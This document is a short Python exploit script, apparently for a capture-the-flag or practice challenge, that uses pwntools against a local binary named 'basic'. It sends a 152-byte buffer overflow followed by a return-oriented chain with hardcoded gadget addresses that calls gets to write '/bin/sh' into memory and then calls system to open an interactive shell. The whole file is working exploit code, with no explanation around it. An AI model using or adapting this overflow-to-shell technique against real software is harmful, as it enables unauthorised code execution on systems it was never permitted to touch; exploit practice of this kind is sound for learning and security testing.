from pwn import *
context.log_level='debug'
system=0x0000000004004F0
rdi=0x0000000000400743
rsi=0x0000000000400741
rbp=0x00000000004005b0
leave=0x000000000040067d
gets=0x000000000400520
bss=0x00601800
p=process("./basic")
gdb.attach(p)
p.sendline("A"*152+p64(rdi)+p64(bss)+p64(gets)+p64(rdi)+p64(bss)+p64(system))
p.sendline("/bin/sh")
p.interactive()
